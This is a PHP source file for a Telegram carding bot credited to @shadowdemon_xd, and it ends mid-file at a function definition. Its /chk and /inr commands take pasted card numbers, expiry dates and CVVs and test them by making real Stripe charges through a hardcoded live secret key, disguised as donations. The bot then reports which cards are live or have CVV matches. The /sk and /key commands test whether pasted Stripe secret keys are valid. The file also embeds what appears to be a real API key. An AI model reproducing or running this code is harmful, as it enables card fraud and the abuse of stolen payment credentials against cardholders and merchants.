<?php

////////////////=============[@shadowdemon_xd CHK BOT]=============////////////////
$botToken = "#"; // Enter ur bot token
$website = "https://api.telegram.org/bot".$botToken;
error_reporting(0);
$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
$chatId = $update["message"]["chat"]["id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$firstname = $update["message"]["from"]["first_name"];
$lastname = $update["message"]["from"]["last_name"];
$username = $update["message"]["from"]["username"];
$message = $update["message"]["text"];
$message_id = $update["message"]["message_id"];
$premiums = file_get_contents('users.txt');
$premium = explode("\n", $premiums);
$group = file_get_contents('groups.txt');
$groups = explode("\n", $group);
if($userId == '1991559687') {
$usernam = ''.shadowdemon_xd.'%0A [Owner]';
}
elseif($userId == '1386134927') {
$usernam = ''.mtchex.'%0A [Owner]';
}
else {
$usernam = $username;
}
$sk = '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';
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
function random_strings($length_of_string) 
{
    $str_result = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; 
    return substr(str_shuffle($str_result),  
                       0, $length_of_string); 
}
$mail = 'shadowdemo2w'.random_strings(6).'';
//////////=========[Start Command]=========//////////


if ((strpos($message, "/info") === 0)||(strpos($message, "!start") === 0)||(strpos($message, "!id") === 0)||(strpos($message, "!info") === 0)||(strpos($message, "/id") === 0)||(strpos($message, "/me") === 0)||(strpos($message, "/start") === 0)){
sendMessage($chatId, "<b>Telegram ID:</b> <code>$userId</code>%0A<b>Group ID: </b><code>$chatId</code>%0A<b>To Know Commands: /cmds</b>", $message_id);
}
elseif ((strpos($message, "/chk") === 0)||(strpos($message, "!chk") === 0)||(strpos($message, ".chk") === 0)){
$message = substr($message, 4);
$amt = multiexplode(array("/", ":", " ", "|"), $message)[0];
$cc = multiexplode(array(":", "/", " ", "|"), $message)[1];
$mes = multiexplode(array(":", "/", " ", "|"), $message)[2];
$ano = multiexplode(array(":", "/", " ", "|"), $message)[3];
$cvv = multiexplode(array(":", "/", " ", "|"), $message)[4];
if (empty($amt)) {
$amt = '1';
}
        $amount = $amt * 100;
        $lista = ''.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'';
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: lookup.binlist.net',
        'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, '');
        $fim = curl_exec($ch);
        $bank = GetStr($fim, '"bank":{"name":"', '"');
        $name = GetStr($fim, '"name":"', '"');
        $brand = GetStr($fim, '"brand":"', '"');
        $country = GetStr($fim, '"country":{"name":"', '"');
        $emoji = GetStr($fim, '"emoji":"', '"');
        $scheme = GetStr($fim, '"scheme":"', '"');
        $type = GetStr($fim, '"type":"', '"');
        if(strpos($fim, '"type":"credit"') !== false){
        $bin = 'Credit';
        }else{
        $bin = 'Debit';
        };
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&billing_details[address][line1]=36&billing_details[address][line2]=Regent Street&billing_details[address][city]=Jamestown&billing_details[address][postal_code]=14701&billing_details[address][state]=New York&billing_details[address][country]=US&billing_details[email]='.$mail.'@gmail.com&billing_details[name]=@shadowdemon_xd Mittal');
        $result1 = curl_exec($ch);
        $tok1 = Getstr($result1,'"id": "','"');
        $msg1 = Getstr($result1,'"message": "','"');
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$amount.'&currency=usd&payment_method_types[]=card&description=@shadowdemon_xd Donation&payment_method='.$tok1.'&confirm=true&off_session=true');
        $result2 = curl_exec($ch);
        $msg2 = Getstr($result2,'"message": "','"');
        $rcp = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));
        if(strpos($result2, '"seller_message": "Payment complete."' )) {
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Successfully Charged $$amt ✅</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);

        }
        elseif(strpos($result2, "insufficient_funds" )) {
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Insufficient Funds</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);}
        elseif ((strpos($result1, "card_error_authentication_required")) || (strpos($result2, "card_error_authentication_required"))){ sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» 3D Card</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);}
        elseif(strpos($result2,'"cvc_check": "pass"')){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Payment Cannot Be Completed</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);}
        elseif(strpos($result2,'"code": "incorrect_cvc"')){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CCN Matched ✅</b>%0A<b>Response -» CVV MISSMATCH</b>%0A<b>Gateway -» Stripe Charge $$amt</b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);}
        elseif(strpos($result1,'"code": "incorrect_cvc"')){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CCN Matched ✅</b>%0A<b>Response -» CVV MISSMATCH</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);}
        elseif ((strpos($result1, "transaction_not_allowed")) || (strpos($result2, "transaction_not_allowed"))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Transaction Not Allowed</b>%0A<b>Gateway -» Stripe Charge $$amt</b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);}
        elseif ((strpos($result1, "fraudulent")) || (strpos($result2, "fraudulent"))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Fraudulent</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);}
        elseif ((strpos($result1, "expired_card")) || (strpos($result2, "expired_card"))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Expired Card</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);}
        elseif ((strpos($result1, "generic_declined")) || (strpos($result2, "generic_declined"))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Generic Declined</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);
        }
        elseif ((strpos($result1, "do_not_honor")) || (strpos($result2, "do_not_honor"))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Do Not Honor</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);}
        elseif ((strpos($result1, 'rate_limit')) || (strpos($result2, 'rate_limit'))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» SK IS AT RATE LIMIT</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);}
        
        elseif ((strpos($result1, "Your card was declined.")) || (strpos($result2, "Your card was declined."))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Generic Declined</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);}
        elseif ((strpos($result1, ' "message": "Your card number is incorrect."')) || (strpos($result2, ' "message": "Your card number is incorrect."'))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Card Number Is Incorrect</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);}
        else {
        sendMessage($chatId, "<b><u><i>Unknown Error. $msg1 - $msg2</i></u></b>", $message_id);
        };
        }
        
        elseif ((strpos($message, "/inr") === 0)||(strpos($message, "!inr") === 0)||(strpos($message, ".inr") === 0)){
$message = substr($message, 4);
$amt = multiexplode(array("/", ":", " ", "|"), $message)[0];
$cc = multiexplode(array(":", "/", " ", "|"), $message)[1];
$mes = multiexplode(array(":", "/", " ", "|"), $message)[2];
$ano = multiexplode(array(":", "/", " ", "|"), $message)[3];
$cvv = multiexplode(array(":", "/", " ", "|"), $message)[4];
if (empty($amt)) {
$amt = '100';
}
        $amount = $amt * 100;
        $lista = ''.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'';
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: lookup.binlist.net',
        'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, '');
        $fim = curl_exec($ch);
        $bank = GetStr($fim, '"bank":{"name":"', '"');
        $name = GetStr($fim, '"name":"', '"');
        $brand = GetStr($fim, '"brand":"', '"');
        $country = GetStr($fim, '"country":{"name":"', '"');
        $emoji = GetStr($fim, '"emoji":"', '"');
        $scheme = GetStr($fim, '"scheme":"', '"');
        $type = GetStr($fim, '"type":"', '"');
        if(strpos($fim, '"type":"credit"') !== false){
        $bin = 'Credit';
        }else{
        $bin = 'Debit';
        };
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&billing_details[address][line1]=36&billing_details[address][line2]=Regent Street&billing_details[address][city]=Jamestown&billing_details[address][postal_code]=14701&billing_details[address][state]=New York&billing_details[address][country]=US&billing_details[email]='.$mail.'@gmail.com&billing_details[name]=@shadowdemon_xd Mittal');
        $result1 = curl_exec($ch);
        $tok1 = Getstr($result1,'"id": "','"');
        $msg1 = Getstr($result1,'"message": "','"');
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$amount.'&currency=inr&payment_method_types[]=card&description=@shadowdemon_xd Donation&payment_method='.$tok1.'&confirm=true&off_session=true');
        $result2 = curl_exec($ch);
        $msg2 = Getstr($result2,'"message": "','"');
        $rcp = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));
        if(strpos($result2, '"seller_message": "Payment complete."' )) {
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Successfully Charged ₹$amt ✅</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);
        }
        elseif(strpos($result2, "insufficient_funds" )) {
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Insufficient Funds</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);}
        elseif ((strpos($result1, "card_error_authentication_required")) || (strpos($result2, "card_error_authentication_required"))){ sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» 3D Card</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);}
        elseif(strpos($result2,'"cvc_check": "pass"')){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Payment Cannot Be Completed</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);}
        elseif(strpos($result2,'"code": "incorrect_cvc"')){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CCN Matched ✅</b>%0A<b>Response -» CVV MISSMATCH</b>%0A<b>Gateway -» Stripe Charge ₹$amt</b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);}
        elseif(strpos($result1,'"code": "incorrect_cvc"')){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CCN Matched ✅</b>%0A<b>Response -» CVV MISSMATCH</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);}
        elseif ((strpos($result1, "transaction_not_allowed")) || (strpos($result2, "transaction_not_allowed"))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Transaction Not Allowed</b>%0A<b>Gateway -» Stripe Charge ₹$amt</b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);}
        elseif ((strpos($result1, "fraudulent")) || (strpos($result2, "fraudulent"))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Fraudulent</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);}
        elseif ((strpos($result1, "expired_card")) || (strpos($result2, "expired_card"))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Expired Card</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);}
        elseif ((strpos($result1, "generic_declined")) || (strpos($result2, "generic_declined"))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Generic Declined</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);
        }
        elseif ((strpos($result1, "do_not_honor")) || (strpos($result2, "do_not_honor"))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Do Not Honor</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);}
        elseif ((strpos($result1, 'rate_limit')) || (strpos($result2, 'rate_limit'))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» SK IS AT RATE LIMIT</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);}
        
        elseif ((strpos($result1, "Your card was declined.")) || (strpos($result2, "Your card was declined."))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Generic Declined</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);}
        elseif ((strpos($result1, ' "message": "Your card number is incorrect."')) || (strpos($result2, ' "message": "Your card number is incorrect."'))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Card Number Is Incorrect</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);}
        else {
        sendMessage($chatId, "<b><u><i>Unknown Error. $msg1 - $msg2</i></u></b>", $message_id);
        };
        }

elseif ((strpos($message, "/cmds") === 0)||(strpos($message, "!cmds") === 0)||(strpos($message, "!command") === 0)||(strpos($message, "!commands") === 0)||(strpos($message, "/commands") === 0)||(strpos($message, "/command") === 0)||(strpos($message, "/cmd") === 0)){
sendMessage($chatId, "<b><i>[Checker Gates]%0A%0ASTRIPE CUSTOM CHARGE -%0A/chk{Amount In $} - xxxxxxxxxxxxxxxx|xx|xx|xxx%0A/inr{Amount In ₹} - xxxxxxxxxxxxxxxx|xx|xx|xxx%0ABIN LOOKUP - /bin -  xxxxxx%0ASK CHECK - /sk -  sk_live_xxxxxxxxxx@shadowdemon_xd%0A%0A[Tools]%0A%0ATELEGRAM ID/GROUP ID - /id</i></b>", $message_id);
}

//////////=========[Bin Command]=========//////////

elseif ((strpos($message, "/bin") === 0)||(strpos($message, "!bin") === 0)||(strpos($message, ".bin") === 0)){
$bin = substr($message, 5);
if (!empty($bin)) {
$ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
};
sendMessage($chatId, '<b>✅ Valid Bin</b>%0A<b>⋆ Bank:</b> '.$bank.'%0A<b>⋆ Country:</b> '.$name.''.$emoji.'%0A<b>⋆ Brand:</b> '.$brand.'%0A<b>⋆ Card:</b> '.$scheme.'%0A<b>⋆ Type:</b> '.$type.'%0A<b>⋆ Checked By:</b> @'.$username.'%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>', $message_id);
}
else {
sendMessage($chatId, '<b>❌ Invalid Bin%0AFormat - /bin xxxxxx</b>', $message_id);
}
}
elseif (strpos($message, "/key") === 0){
$sec = substr($message, 5);
if (!empty($sec)) {
$skhidden = substr_replace($sec, '',12).preg_replace("/(?!^).(?!$)/", "x", substr($sec, 12));
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]=4912461004526326&card[exp_month]=04&card[exp_year]=2024&card[cvc]=011');
$result = curl_exec($ch);
$response = trim(strip_tags(GetStr($result,'"message": "','"')));
if (strpos($result, 'tok_')){
sendMessage($chatId, "<b>✅ LIVE KEY</b>%0A<u>⋆ KEY:</u> <code>$skhidden</code>%0A<u>⋆ RESPONSE:</u> SK LIVE!!%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);
}
elseif (strpos($result, 'Invalid API Key provided')){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>⋆ KEY:</u> <code>$sec</code>%0A<u>⋆ RESPONSE:</u> INVALID KEY%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);
}
elseif (strpos($result, 'You did not provide an API key.')){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>⋆ KEY:</u> <code>$sec</code>%0A<u>⋆ RESPONSE:</u> No Sk Key Provided%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);
}
elseif (strpos($result, 'rate_limit')){
sendMessage($chatId, "<b>⚠️ DEAD KEY</b>%0A<u>⋆ KEY:</u> <code>$sec</code>%0A<u>⋆ RESPONSE:</u> Rate Limited Key%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);
}
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>⋆ KEY:</u> <code>$sec</code>%0A<u>⋆ RESPONSE:</u> Testmode Charges Only%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);
}
elseif (strpos($result, 'api_key_expired')){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>⋆ KEY:</u> <code>$sec</code>%0A<u>⋆ RESPONSE:</u> Api Key Expired%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);
}
else{
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>⋆ KEY:</u> <code>$skhidden</code>%0A<u>⋆ RESPONSE:</u> Unknown Error.%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);
}
}
else {
sendMessage($chatId, '<b>❌ No Sk Provided%0AFormat - /key sk_live_xxxxxxxxxxx</b>', $message_id);
}
delMessage($chatId, $message_id);
;}
elseif (strpos($message, "/sk") === 0){
$sec = substr($message, 4);
if (!empty($sec)) {
$skhidden = substr_replace($sec, '',12).preg_replace("/(?!^).(?!$)/", "x", substr($sec, 12));
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]=4912461004526326&card[exp_month]=04&card[exp_year]=2024&card[cvc]=011');
$result = curl_exec($ch);
$response = trim(strip_tags(GetStr($result,'"message": "','"')));
if (strpos($result, 'tok_')){
sendMessage($chatId, "<b>✅ LIVE KEY</b>%0A<u>⋆ KEY:</u> <code>$skhidden</code>%0A<u>⋆ RESPONSE:</u> SK LIVE!!%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);
}
elseif (strpos($result, 'Invalid API Key provided')){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>⋆ KEY:</u> <code>$sec</code>%0A<u>⋆ RESPONSE:</u> INVALID KEY%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);
}
elseif (strpos($result, 'You did not provide an API key.')){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>⋆ KEY:</u> <code>$sec</code>%0A<u>⋆ RESPONSE:</u> No Sk Key Provided%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);
}
elseif (strpos($result, 'rate_limit')){
sendMessage($chatId, "<b>⚠️ LIVE KEY</b>%0A<u>⋆ KEY:</u> <code>$sec</code>%0A<u>⋆ RESPONSE:</u> Rate Limited Key%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);
}
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>⋆ KEY:</u> <code>$sec</code>%0A<u>⋆ RESPONSE:</u> Testmode Charges Only%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);
}
elseif (strpos($result, 'api_key_expired')){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>⋆ KEY:</u> <code>$sec</code>%0A<u>⋆ RESPONSE:</u> Api Key Expired%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);
}
else{
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>⋆ KEY:</u> <code>$skhidden</code>%0A<u>⋆ RESPONSE:</u> Unknown Error.%0A<u>⋆ Checked By:</u> @$usernam%0A%0A<b>⋆ Bot By: @shadowdemon_xd</b>", $message_id);
}
}
else {
sendMessage($chatId, '<b>❌ No Sk Provided%0AFormat - /sk sk_live_xxxxxxxxxxx</b>', $message_id);
}
delMessage($chatId, $message_id);
;}
function sendMessage ($chatId, $message, $message_id){
